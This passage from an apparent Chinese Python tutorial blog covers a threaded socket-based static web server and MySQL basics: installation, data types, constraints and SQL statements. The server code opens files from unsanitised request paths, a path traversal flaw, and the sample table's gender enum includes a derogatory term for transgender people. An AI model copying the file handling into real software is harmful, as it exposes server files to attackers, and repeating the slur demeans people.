静态Web服务器-返回指定页面数据的示例代码"></a>2. 静态Web服务器-返回指定页面数据的示例代码</h3><pre><code class="python">import socketdef main():    # 创建tcp服务端套接字    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # 设置端口号复用, 程序退出端口立即释放    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)    # 绑定端口号    tcp_server_socket.bind((&quot;&quot;, 9000))    # 设置监听    tcp_server_socket.listen(128)    while True:        # 等待接受客户端的连接请求        new_socket, ip_port = tcp_server_socket.accept()        # 代码执行到此，说明连接建立成功        recv_client_data = new_socket.recv(4096)        if len(recv_client_data) == 0:            print(&quot;关闭浏览器了&quot;)            new_socket.close()            return        # 对二进制数据进行解码        recv_client_content = recv_client_data.decode(&quot;utf-8&quot;)        print(recv_client_content)        # 根据指定字符串进行分割， 最大分割次数指定2        request_list = recv_client_content.split(&quot; &quot;, maxsplit=2)        # 获取请求资源路径        request_path = request_list[1]        print(request_path)        # 判断请求的是否是根目录，如果条件成立，指定首页数据返回        if request_path == &quot;/&quot;:            request_path = &quot;/index.html&quot;        try:            # 动态打开指定文件            with open(&quot;static&quot; + request_path, &quot;rb&quot;) as file:                # 读取文件数据                file_data = file.read()        except Exception as e:            # 请求资源不存在，返回404数据            # 响应行            response_line = &quot;HTTP/1.1 404 Not Found\r\n&quot;            # 响应头            response_header = &quot;Server: PWS1.0\r\n&quot;            with open(&quot;static/error.html&quot;, &quot;rb&quot;) as file:                file_data = file.read()            # 响应体            response_body = file_data            # 拼接响应报文            response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body            # 发送数据            new_socket.send(response_data)        else:            # 响应行            response_line = &quot;HTTP/1.1 200 OK\r\n&quot;            # 响应头            response_header = &quot;Server: PWS1.0\r\n&quot;            # 响应体            response_body = file_data            # 拼接响应报文            response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body            # 发送数据            new_socket.send(response_data)        finally:            # 关闭服务与客户端的套接字            new_socket.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="九、静态Web服务器-多任务版"><a href="#九、静态Web服务器-多任务版" class="headerlink" title="九、静态Web服务器-多任务版"></a>九、静态Web服务器-多任务版</h2><h3 id="1-静态Web服务器的问题-1"><a href="#1-静态Web服务器的问题-1" class="headerlink" title="1. 静态Web服务器的问题"></a>1. 静态Web服务器的问题</h3><p>目前的Web服务器，不能支持多用户同时访问，只能一个一个的处理客户端的请求，那么如何开发多任务版的web服务器同时处理 多个客户端的请求?</p><p>可以使用<strong>多线程</strong>，比进程更加节省内存资源。</p><p><strong>多任务版web服务器程序的实现步骤:</strong></p><ol><li>当客户端和服务端建立连接成功，创建子线程，使用子线程专门处理客户端的请求，防止主线程阻塞。</li><li>把创建的子线程设置成为守护主线程，防止主线程无法退出。</li></ol><h3 id="2-静态Web服务器-多任务版的示例代码"><a href="#2-静态Web服务器-多任务版的示例代码" class="headerlink" title="2. 静态Web服务器-多任务版的示例代码"></a>2. 静态Web服务器-多任务版的示例代码</h3><pre><code class="python">import socketimport threading# 处理客户端的请求def handle_client_request(new_socket):    # 代码执行到此，说明连接建立成功    recv_client_data = new_socket.recv(4096)    if len(recv_client_data) == 0:        print(&quot;关闭浏览器了&quot;)        new_socket.close()        return    # 对二进制数据进行解码    recv_client_content = recv_client_data.decode(&quot;utf-8&quot;)    print(recv_client_content)    # 根据指定字符串进行分割， 最大分割次数指定2    request_list = recv_client_content.split(&quot; &quot;, maxsplit=2)    # 获取请求资源路径    request_path = request_list[1]    print(request_path)    # 判断请求的是否是根目录，如果条件成立，指定首页数据返回    if request_path == &quot;/&quot;:        request_path = &quot;/index.html&quot;    try:        # 动态打开指定文件        with open(&quot;static&quot; + request_path, &quot;rb&quot;) as file:            # 读取文件数据            file_data = file.read()    except Exception as e:        # 请求资源不存在，返回404数据        # 响应行        response_line = &quot;HTTP/1.1 404 Not Found\r\n&quot;        # 响应头        response_header = &quot;Server: PWS1.0\r\n&quot;        with open(&quot;static/error.html&quot;, &quot;rb&quot;) as file:            file_data = file.read()        # 响应体        response_body = file_data        # 拼接响应报文        response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body        # 发送数据        new_socket.send(response_data)    else:        # 响应行        response_line = &quot;HTTP/1.1 200 OK\r\n&quot;        # 响应头        response_header = &quot;Server: PWS1.0\r\n&quot;        # 响应体        response_body = file_data        # 拼接响应报文        response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body        # 发送数据        new_socket.send(response_data)    finally:        # 关闭服务与客户端的套接字        new_socket.close()# 程序入口函数def main():    # 创建tcp服务端套接字    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # 设置端口号复用, 程序退出端口立即释放    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)    # 绑定端口号    tcp_server_socket.bind((&quot;&quot;, 9000))    # 设置监听    tcp_server_socket.listen(128)    while True:        # 等待接受客户端的连接请求        new_socket, ip_port = tcp_server_socket.accept()        print(ip_port)        # 当客户端和服务器建立连接程，创建子线程        sub_thread = threading.Thread(target=handle_client_request, args=(new_socket,))        # 设置守护主线程        sub_thread.setDaemon(True)        # 启动子线程执行对应的任务        sub_thread.start()if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="十、静态Web服务器-面向对象开发"><a href="#十、静态Web服务器-面向对象开发" class="headerlink" title="十、静态Web服务器-面向对象开发"></a>十、静态Web服务器-面向对象开发</h2><h3 id="1-以面向对象的方式开发静态Web服务器"><a href="#1-以面向对象的方式开发静态Web服务器" class="headerlink" title="1. 以面向对象的方式开发静态Web服务器"></a>1. 以面向对象的方式开发静态Web服务器</h3><p><strong>实现步骤:</strong></p><ol><li>把提供服务的Web服务器抽象成一个类(HTTPWebServer)</li><li>提供Web服务器的初始化方法，在初始化方法里面创建socket对象</li><li>提供一个开启Web服务器的方法，让Web服务器处理客户端请求操作。</li></ol><h3 id="2-静态Web服务器-面向对象开发的示例代码"><a href="#2-静态Web服务器-面向对象开发的示例代码" class="headerlink" title="2. 静态Web服务器-面向对象开发的示例代码"></a>2. 静态Web服务器-面向对象开发的示例代码</h3><pre><code class="python">import socketimport threading# 定义web服务器类class HttpWebServer(object):    def __init__(self):        # 创建tcp服务端套接字        tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # 设置端口号复用, 程序退出端口立即释放        tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)        # 绑定端口号        tcp_server_socket.bind((&quot;&quot;, 9000))        # 设置监听        tcp_server_socket.listen(128)        # 保存创建成功的服务器套接字        self.tcp_server_socket = tcp_server_socket    # 处理客户端的请求    @staticmethod    def handle_client_request(new_socket):        # 代码执行到此，说明连接建立成功        recv_client_data = new_socket.recv(4096)        if len(recv_client_data) == 0:            print(&quot;关闭浏览器了&quot;)            new_socket.close()            return        # 对二进制数据进行解码        recv_client_content = recv_client_data.decode(&quot;utf-8&quot;)        print(recv_client_content)        # 根据指定字符串进行分割， 最大分割次数指定2        request_list = recv_client_content.split(&quot; &quot;, maxsplit=2)        # 获取请求资源路径        request_path = request_list[1]        print(request_path)        # 判断请求的是否是根目录，如果条件成立，指定首页数据返回        if request_path == &quot;/&quot;:            request_path = &quot;/index.html&quot;        try:            # 动态打开指定文件            with open(&quot;static&quot; + request_path, &quot;rb&quot;) as file:                # 读取文件数据                file_data = file.read()        except Exception as e:            # 请求资源不存在，返回404数据            # 响应行            response_line = &quot;HTTP/1.1 404 Not Found\r\n&quot;            # 响应头            response_header = &quot;Server: PWS1.0\r\n&quot;            with open(&quot;static/error.html&quot;, &quot;rb&quot;) as file:                file_data = file.read()            # 响应体            response_body = file_data            # 拼接响应报文            response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body            # 发送数据            new_socket.send(response_data)        else:            # 响应行            response_line = &quot;HTTP/1.1 200 OK\r\n&quot;            # 响应头            response_header = &quot;Server: PWS1.0\r\n&quot;            # 响应体            response_body = file_data            # 拼接响应报文            response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body            # 发送数据            new_socket.send(response_data)        finally:            # 关闭服务与客户端的套接字            new_socket.close()    # 启动web服务器进行工作    def start(self):        while True:            # 等待接受客户端的连接请求            new_socket, ip_port = self.tcp_server_socket.accept()            # 当客户端和服务器建立连接程，创建子线程            sub_thread = threading.Thread(target=self.handle_client_request, args=(new_socket,))            # 设置守护主线程            sub_thread.setDaemon(True)            # 启动子线程执行对应的任务            sub_thread.start()# 程序入口函数def main():    # 创建web服务器对象    web_server = HttpWebServer()    # 启动web服务器进行工作    web_server.start()if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="十一、静态Web服务器-命令行启动动态绑定端口号"><a href="#十一、静态Web服务器-命令行启动动态绑定端口号" class="headerlink" title="十一、静态Web服务器-命令行启动动态绑定端口号"></a>十一、静态Web服务器-命令行启动动态绑定端口号</h2><h3 id="1-开发命令行启动动态绑定端口号的静态web服务器"><a href="#1-开发命令行启动动态绑定端口号的静态web服务器" class="headerlink" title="1. 开发命令行启动动态绑定端口号的静态web服务器"></a>1. 开发命令行启动动态绑定端口号的静态web服务器</h3><p><strong>实现步骤:</strong></p><ol><li>获取执行python程序的终端命令行参数</li><li>判断参数的类型，设置端口号必须是整型</li><li>给Web服务器类的初始化方法添加一个端口号参数，用于绑定端口号</li></ol><h3 id="2-静态Web服务器-命令行启动动态绑定端口号的示例代码"><a href="#2-静态Web服务器-命令行启动动态绑定端口号的示例代码" class="headerlink" title="2. 静态Web服务器-命令行启动动态绑定端口号的示例代码"></a>2. 静态Web服务器-命令行启动动态绑定端口号的示例代码</h3><pre><code class="python">import socketimport threadingimport sys# 定义web服务器类class HttpWebServer(object):    def __init__(self, port):        # 创建tcp服务端套接字        tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # 设置端口号复用, 程序退出端口立即释放        tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)        # 绑定端口号        tcp_server_socket.bind((&quot;&quot;, port))        # 设置监听        tcp_server_socket.listen(128)        # 保存创建成功的服务器套接字        self.tcp_server_socket = tcp_server_socket    # 处理客户端的请求    @staticmethod    def handle_client_request(new_socket):        # 代码执行到此，说明连接建立成功        recv_client_data = new_socket.recv(4096)        if len(recv_client_data) == 0:            print(&quot;关闭浏览器了&quot;)            new_socket.close()            return        # 对二进制数据进行解码        recv_client_content = recv_client_data.decode(&quot;utf-8&quot;)        print(recv_client_content)        # 根据指定字符串进行分割， 最大分割次数指定2        request_list = recv_client_content.split(&quot; &quot;, maxsplit=2)        # 获取请求资源路径        request_path = request_list[1]        print(request_path)        # 判断请求的是否是根目录，如果条件成立，指定首页数据返回        if request_path == &quot;/&quot;:            request_path = &quot;/index.html&quot;        try:            # 动态打开指定文件            with open(&quot;static&quot; + request_path, &quot;rb&quot;) as file:                # 读取文件数据                file_data = file.read()        except Exception as e:            # 请求资源不存在，返回404数据            # 响应行            response_line = &quot;HTTP/1.1 404 Not Found\r\n&quot;            # 响应头            response_header = &quot;Server: PWS1.0\r\n&quot;            with open(&quot;static/error.html&quot;, &quot;rb&quot;) as file:                file_data = file.read()            # 响应体            response_body = file_data            # 拼接响应报文            response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body            # 发送数据            new_socket.send(response_data)        else:            # 响应行            response_line = &quot;HTTP/1.1 200 OK\r\n&quot;            # 响应头            response_header = &quot;Server: PWS1.0\r\n&quot;            # 响应体            response_body = file_data            # 拼接响应报文            response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body            # 发送数据            new_socket.send(response_data)        finally:            # 关闭服务与客户端的套接字            new_socket.close()    # 启动web服务器进行工作    def start(self):        while True:            # 等待接受客户端的连接请求            new_socket, ip_port = self.tcp_server_socket.accept()            # 当客户端和服务器建立连接程，创建子线程            sub_thread = threading.Thread(target=self.handle_client_request, args=(new_socket,))            # 设置守护主线程            sub_thread.setDaemon(True)            # 启动子线程执行对应的任务            sub_thread.start()# 程序入口函数def main():    print(sys.argv)    # 判断命令行参数是否等于2,    if len(sys.argv) != 2:        print(&quot;执行命令如下: python3 xxx.py 8000&quot;)        return    # 判断字符串是否都是数字组成    if not sys.argv[1].isdigit():        print(&quot;执行命令如下: python3 xxx.py 8000&quot;)        return    # 获取终端命令行参数    port = int(sys.argv[1])    # 创建web服务器对象    web_server = HttpWebServer(port)    # 启动web服务器进行工作    web_server.start()if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级08-MySQL数据库</title>
      <link href="/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A708-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A708-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h1><h2 id="一、MySQL数据库的基本使用"><a href="#一、MySQL数据库的基本使用" class="headerlink" title="一、MySQL数据库的基本使用"></a>一、MySQL数据库的基本使用</h2><h3 id="1-数据库"><a href="#1-数据库" class="headerlink" title="1.数据库"></a>1.数据库</h3><a id="more"></a><h4 id="1-1-数据库的介绍"><a href="#1-1-数据库的介绍" class="headerlink" title="1.1 数据库的介绍"></a>1.1 数据库的介绍</h4><p>数据库就是<strong>存储和管理数据的仓库</strong>，数据按照一定的格式进行存储，用户可以对数据库中的数据进行增加、修改、删除、查询等操作。</p><h4 id="1-2-数据库的分类"><a href="#1-2-数据库的分类" class="headerlink" title="1.2 数据库的分类"></a>1.2 数据库的分类</h4><ul><li>关系型数据库</li><li>非关系型数据库</li></ul><p><strong>关系型数据库:</strong></p><p>是指采用了关系模型来组织数据的数据库，简单来说，<strong>关系模型指的就是二维表格模型</strong>，好比Excel文件中的表格，强调使用表格的方式存储数据。</p><p><strong>关系型数据库中核心元素</strong></p><ul><li>数据行</li><li>数据列</li><li>数据表</li><li>数据库(数据表的集合)</li></ul><p><strong>常用的关系型数据库:</strong></p><ul><li>Oracle</li><li>Microsoft SQL Server</li><li>MySQL</li><li>SQLite</li></ul><p><strong>非关系型数据库:</strong></p><p>非关系型数据库，又被称为NoSQL（Not Only SQL )，意为不仅仅是SQL，对NoSQL 最普遍的定义是“非关联型的”，强调 Key-Value 的方式存储数据。</p><p><strong>常用的非关系型数据库:</strong></p><ul><li>MongoDB</li><li>Redis</li></ul><h4 id="1-3-数据库的作用"><a href="#1-3-数据库的作用" class="headerlink" title="1.3 数据库的作用"></a>1.3 数据库的作用</h4><p>数据库的作用就是存储和管理数据的，比如: 我们在京东网站上的浏览的商品列表数据，这些数据都会存储在数据库。</p><h4 id="1-4-数据库的特点"><a href="#1-4-数据库的特点" class="headerlink" title="1.4 数据库的特点"></a>1.4 数据库的特点</h4><ol><li>持久化存储</li><li>读写速度极高</li><li>保证数据的有效性</li></ol><h3 id="2-关系型数据库管理系统"><a href="#2-关系型数据库管理系统" class="headerlink" title="2.关系型数据库管理系统"></a>2.关系型数据库管理系统</h3><h4 id="2-1-关系型数据库管理系统的介绍"><a href="#2-1-关系型数据库管理系统的介绍" class="headerlink" title="2.1 关系型数据库管理系统的介绍"></a>2.1 关系型数据库管理系统的介绍</h4><p>数据库管理系统（英语全拼：Relational Database Management System，简称RDBMS）是<strong>为管理关系型数据库而设计的软件系统，如果大家想要使用关系型数据库就需要安装数据库管理系统，其实就是一个应用软件</strong>。</p><p><strong>关系型数据库管理系统可以分为:</strong></p><ul><li>关系型数据库服务端软件</li><li>关系型数据库客户端软件</li></ul><p><strong>关系型数据库服务端软件:</strong></p><p>主要负责管理不同的数据库，而每个数据库里面会有一系列数据文件，数据文件是用来存储数据的, 其实数据库就是一系列数据文件的集合。</p><p><strong>关系型数据库客户端软件:</strong></p><p>主要负责和关系型数据库服务端软件进行通信, 向服务端传输数据或者从服务端获取数据.</p><p><strong>说明:</strong></p><ol><li>用户操作关系型数据库客户端，实现数据库相关操作。</li><li>关系数据库客户端借助网络使用SQL语言和关系型数据库服务端进行数据通信</li><li>关系型数据库服务端管理着不同的数据库，每个数据库会有一系列的数据文件，数据都保存在数据文件里面，每个数据库可以理解成是一个文件夹。</li><li>数据库客户端和数据库服务器想要通信需要使用SQL。</li></ol><h4 id="2-2-SQL的介绍"><a href="#2-2-SQL的介绍" class="headerlink" title="2.2 SQL的介绍"></a>2.2 SQL的介绍</h4><p>SQL(Structured Query Language)是结构化查询语言，是一种用来操作RDBMS的数据库的语言。也就是说通过 SQL 可以操作 oracle,sql server,mysql,sqlite 等关系型的数据库。</p><p>SQL的作用是实现数据库客户端和数据库服务端之间的通信，SQL就是通信的桥梁。</p><p><strong>SQL语言主要分为：</strong></p><ul><li><strong>DQL：数据查询语言，用于对数据进行查询，如select</strong></li><li><strong>DML：数据操作语言，对数据进行增加、修改、删除，如insert、update、delete</strong></li><li>TPL：事务处理语言，对事务进行处理，包括begin transaction、commit、rollback</li><li>DCL：数据控制语言，进行授权与权限回收，如grant、revoke</li><li>DDL：数据定义语言，进行数据库、表的管理等，如create、drop</li></ul><p><strong>说明:</strong></p><ul><li>对于程序员来讲，重点是数据的增、删、改、查，必须熟练编写DQL、DML，能够编写DDL完成数据库、表的操作，其它操作如TPL、DCL了解即可.</li><li>SQL语言不区分大小写</li></ul><p>​    </p><h3 id="3-MySQL数据库"><a href="#3-MySQL数据库" class="headerlink" title="3.MySQL数据库"></a>3.MySQL数据库</h3><h4 id="3-1-MySQL数据库的介绍"><a href="#3-1-MySQL数据库的介绍" class="headerlink" title="3.1 MySQL数据库的介绍"></a>3.1 MySQL数据库的介绍</h4><p>MySQL是一个关系型数据库管理系统，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件，它是由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品，MySQL 是最流行的关系型数据库管理系统中的一个。</p><p><strong>MySQL的特点:</strong></p><ol><li>MySQL是开源的，所以你不需要支付额外的费用。</li><li>MySQL支持大型的数据库。可以处理拥有上千万条记录的大型数据库。</li><li>MySQL使用标准的SQL数据语言形式。</li><li>MySQL可以安装在不同的操作系统，并且提供多种编程语言的操作接口。这些编程语言包括C、C++、Python、Java、Ruby等等。</li></ol><h4 id="3-2-MySQL数据库的安装"><a href="#3-2-MySQL数据库的安装" class="headerlink" title="3.2 MySQL数据库的安装"></a>3.2 MySQL数据库的安装</h4><ul><li>MySQL数据库服务端软件的安装</li><li>MySQL数据库客户端软件的安装</li></ul><p><strong>MySQL数据库服务端软件的安装:</strong></p><p>在Ubuntu中打开终端，输入下面的命令:</p><pre><code class="bash">sudo apt install mysql-server mysql-client</code></pre><p>manjaro安装mysql：</p><pre><code class="bash">sudo pacman -S mysql</code></pre><p>centos 安装mysql </p><pre><code class="bash">yum install mysql mysql-devel -y</code></pre><p><strong>查看MySQL服务状态:</strong></p><pre><code class="bash">sudo service mysql status</code></pre><p><strong>停止MySQL服务:</strong></p><pre><code class="bash">sudo service mysql stop</code></pre><p><strong>启动MySQL服务:</strong></p><pre><code class="bash">sudo service mysql start</code></pre><p><strong>重启MySQL服务:</strong></p><pre><code class="bash">sudo service mysql restart</code></pre><p><strong>MySQL配置文件的介绍:</strong>（ubutnu）</p><p>配置文件路径为: /etc/mysql/mysql.conf.d/mysqld.cnf</p><p><strong>主要配置信息说明:</strong></p><pre><code class="bash">port表示端口号，默认为3306bind-address表示服务器绑定的ip，默认为127.0.0.1datadir表示数据库保存路径，默认为/var/lib/mysqllog_error表示错误日志，默认为/var/log/mysql/error.log</code></pre><p><strong>MySQL数据库客户端软件的安装:</strong></p><p>客户端是程序员或者dba使用的软件，通过socket方式与服务端程序通信。</p><p>常用的MySQL数据库客户端软件有</p><ol><li>图形化界面客户端Navicat</li><li>命令行客户端mysql</li></ol><p><strong>mysql命令的使用帮助:</strong></p><pre><code class="bash">mysql --help</code></pre><p><strong>MySQL客户端的使用:</strong></p><p>MySQL客户端连接MySQL服务端命令</p><pre><code class="bash">mysql -uroot -p</code></pre><p><strong>说明:</strong></p><ul><li>-u: 表示MySQL服务端的用户名</li><li>-p: 表示MySQL服务端的密码</li><li>quit 或者 exit 或者 ctr + d 表示退出</li></ul><h3 id="4-数据类型和约束"><a href="#4-数据类型和约束" class="headerlink" title="4.数据类型和约束"></a>4.数据类型和约束</h3><h4 id="4-1-数据类型"><a href="#4-1-数据类型" class="headerlink" title="4.1 数据类型"></a>4.1 数据类型</h4><p>数据类型是指在创建表的时候为表中字段指定数据类型，只有数据符合类型要求才能存储起来，使用数据类型的原则是:够用就行，尽量使用取值范围小的，而不用大的，这样可以更多的节省存储空间。</p><p><strong>常用数据类型如下:</strong></p><ul><li>整数：int，bit</li><li>小数：decimal</li><li>字符串：varchar,char</li><li>日期时间: date, time, datetime</li><li>枚举类型(enum)</li></ul><p><strong>数据类型说明:</strong></p><ul><li>decimal表示浮点数，如 decimal(5, 2) 表示共存5位数，小数占 2 位.</li><li>char表示固定长度的字符串，如char(3)，如果填充’ab’时会补一个空格为’ab ‘，3表示字符数</li><li>varchar表示可变长度的字符串，如varchar(3)，填充’ab’时就会存储’ab’，3表示字符数</li><li>对于图片、音频、视频等文件，不存储在数据库中，而是上传到某个服务器上，然后在表中存储这个文件的保存路径.</li><li>字符串 text 表示存储大文本，当字符大于 4000 时推荐使用, 比如技术博客.</li></ul><h4 id="4-2-数据约束"><a href="#4-2-数据约束" class="headerlink" title="4.2 数据约束"></a>4.2 数据约束</h4><p>约束是指数据在数据类型限定的基础上额外增加的要求.</p><p><strong>常见的约束如下:</strong></p><ul><li>主键 primary key: 物理上存储的顺序. MySQL 建议所有表的主键字段都叫 id, 类型为 int unsigned.</li><li>非空 not null: 此字段不允许填写空值.</li><li>惟一 unique: 此字段的值不允许重复.</li><li>默认 default: 当不填写字段对应的值会使用默认值，如果填写时以填写为准.</li><li>外键 foreign key: 对关系字段进行约束, 当为关系字段填写值时, 会到关联的表中查询此值是否存在, 如果存在则填写成功, 如果不存在则填写失败并抛出异常.</li></ul><h4 id="4-3-数据类型附录表"><a href="#4-3-数据类型附录表" class="headerlink" title="4.3 数据类型附录表"></a>4.3 数据类型附录表</h4><h5 id="4-3-1-整数类型"><a href="#4-3-1-整数类型" class="headerlink" title="4.3.1 整数类型"></a>4.3.1 整数类型</h5><table><thead><tr><th align="left">类型</th><th align="left">字节大小</th><th align="left">有符号范围(Signed)</th><th align="left">无符号范围(Unsigned)</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1</td><td align="left">-128 ~ 127</td><td align="left">0 ~ 255</td></tr><tr><td align="left">SMALLINT</td><td align="left">2</td><td align="left">-32768 ~ 32767</td><td align="left">0 ~ 65535</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3</td><td align="left">-8388608 ~ 8388607</td><td align="left">0 ~ 16777215</td></tr><tr><td align="left">INT/INTEGER</td><td align="left">4</td><td align="left">-2147483648 ~2147483647</td><td align="left">0 ~ 4294967295</td></tr><tr><td align="left">BIGINT</td><td align="left">8</td><td align="left">-9223372036854775808 ~ 9223372036854775807</td><td align="left">0 ~ 18446744073709551615</td></tr></tbody></table><h5 id="4-3-2-字符串"><a href="#4-3-2-字符串" class="headerlink" title="4.3.2 字符串"></a>4.3.2 字符串</h5><table><thead><tr><th align="left">类型</th><th align="left">说明</th><th align="left">使用场景</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">固定长度，小型数据</td><td align="left">身份证号、手机号、电话、密码</td></tr><tr><td align="left">VARCHAR</td><td align="left">可变长度，小型数据</td><td align="left">姓名、地址、品牌、型号</td></tr><tr><td align="left">TEXT</td><td align="left">可变长度，字符个数大于 4000</td><td align="left">存储小型文章或者新闻</td></tr><tr><td align="left">LONGTEXT</td><td align="left">可变长度， 极大型文本数据</td><td align="left">存储极大型文本数据</td></tr></tbody></table><h5 id="4-3-3-时间类型"><a href="#4-3-3-时间类型" class="headerlink" title="4.3.3 时间类型"></a>4.3.3 时间类型</h5><table><thead><tr><th align="left">类型</th><th align="left">字节大小</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">4</td><td align="left">‘2020-01-01’</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘12:29:59’</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">‘2020-01-01 12:29:59’</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">‘2017’</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">‘1970-01-01 00:00:01’ UTC ~ ‘2038-01-01 00:00:01’ UTC</td></tr></tbody></table><h5 id="4-3-4-小结"><a href="#4-3-4-小结" class="headerlink" title="4.3.4 小结"></a>4.3.4 小结</h5><ul><li>常用的数据类型:<ul><li>整数：int，bit</li><li>小数：decimal</li><li>字符串：varchar,char</li><li>日期时间: date, time, datetime</li><li>枚举类型(enum)</li></ul></li><li>常见的约束:<ul><li>主键约束 primary key</li><li>非空约束 not null</li><li>惟一约束 unique</li><li>默认约束 default</li><li>外键约束 foreign key</li></ul></li><li>数据类型和约束保证了表中数据的准确性和完整性</li></ul><h3 id="5-命令行客户端MySQL的使用"><a href="#5-命令行客户端MySQL的使用" class="headerlink" title="5.命令行客户端MySQL的使用"></a>5.命令行客户端MySQL的使用</h3><h4 id="5-1-登录和登出数据库"><a href="#5-1-登录和登出数据库" class="headerlink" title="5.1 登录和登出数据库"></a>5.1 登录和登出数据库</h4><p><strong>登录数据库:</strong></p><p>输入下面命令:</p><pre><code class="bash">mysql -uroot -p</code></pre><p><strong>说明:</strong></p><ul><li>-u 后面是登录的用户名</li><li>-p 后面是登录密码, 如果不填写, 回车之后会提示输入密码</li></ul><p><strong>登录成功后, 输入如下命令查看效果：</strong></p><pre><code class="sql"># 显示当前时间select now();</code></pre><p><strong>登出(退出)数据库:</strong></p><pre><code class="sql">quit 或 exit 或 ctrl + d</code></pre><h4 id="5-2-数据库操作的SQL语句"><a href="#5-2-数据库操作的SQL语句" class="headerlink" title="5.2 数据库操作的SQL语句"></a>5.2 数据库操作的SQL语句</h4><ol><li><p>查看所有数据库</p><pre><code class="sql">show databases;</code></pre></li><li><p>创建数据库</p><pre><code class="sql">create database 数据库名 charset=utf8;例：create database python charset=utf8;</code></pre></li><li><p>使用数据库</p><pre><code class="sql">use 数据库名;</code></pre></li><li><p>查看当前使用的数据库</p><pre><code class="sql">select database();</code></pre></li><li><p>删除数据库-慎重</p><pre><code class="sql">drop database 数据库名;例：drop database python;</code></pre></li></ol><h4 id="5-3-表结构操作的SQL语句"><a href="#5-3-表结构操作的SQL语句" class="headerlink" title="5.3 表结构操作的SQL语句"></a>5.3 表结构操作的SQL语句</h4><ol><li><p>查看当前数据库中所有表</p><pre><code class="sql">show tables;</code></pre></li><li><p>创建表</p><pre><code class="sql">create table students( id int unsigned primary key auto_increment not null, name varchar(20) not null, age tinyint unsigned default 0, height decimal(5,2), gender enum(&#39;男&#39;,&#39;女&#39;,&#39;人妖&#39;,&#39;保密&#39;) default &#39;保密&#39;);</code></pre><p><strong>说明:</strong></p><pre><code class="sql">create table 表名(字段名称 数据类型  可选的约束条件,column1 datatype contrai,...);</code></pre></li><li><p>修改表-添加字段</p><pre><code class="sql">alter table 表名 add 列名 类型 约束;例：alter table students add birthday datetime;</code></pre></li><li><p>修改表-修改字段类型</p><pre><code class="sql">alter table 表名 modify 列名 类型 约束;例：alter table students modify birthday date not null;</code></pre><p><strong>说明:</strong></p><ul><li>modify: 只能修改字段类型或者约束，不能修改字段名</li></ul></li><li><p>修改表-修改字段名和字段类型</p><pre><code class="sql">alter table 表名 change 原名 新名 类型及约束;例：alter table students change birthday birth datetime not null;</code></pre><p><strong>说明:</strong></p><ul><li>change: 既能对字段重命名又能修改字段类型还能修改约束</li></ul></li><li><p>修改表-删除字段</p><pre><code class="sql">alter table 表名 drop 列名;例：alter table students drop birthday;</code></pre></li><li><p>查看创表SQL语句</p><pre><code class="sql">show create table 表名;例：show create table students;</code></pre></li><li><p>查看创库SQL语句</p><pre><code class="sql">show create database 数据库名;例：show create database mytest;</code></pre></li><li><p>删除表</p><pre><code class="sql">drop table 表名;例：drop table students;</code></pre></li></ol><h4 id="5-4-表数据操作的SQL语句"><a href="#5-4-表数据操作的SQL语句" class="headerlink" title="5.4 表数据操作的SQL语句"></a>5.4 表数据操作的SQL语句</h4><ol><li><p>查询数据</p><pre><code class="sql">-- 1. 查询所有列select * from 表名;例：select * from students;-- 2. 查询指定列select 列1,列2,... from 表名;例：select id,name from students;</code></pre></li><li><p>添加数据</p><pre><code class="sql">-- 1. 全列插入：值的顺序与表结构字段的顺序完全一一对应insert into 表名 values (...)例:insert into students values(0, &#39;xx&#39;, default, default, &#39;男&#39;);-- 2. 部分列插入：值的顺序与给出的列顺序对应insert into 表名 (列1,...) values(值1,...)例:insert into students(name, age) values(&#39;王二小&#39;, 15);-- 3. 全列多行插入insert into 表名 values(...),(...)...;例:insert into students values(0, &#39;张飞&#39;, 55, 1.75, &#39;男&#39;),(0, &#39;关羽&#39;, 58, 1.85, &#39;男&#39;);-- 4. 部分列多行插入insert into 表名(列1,...) values(值1,...),(值1,...)...;例：insert into students(name, height) 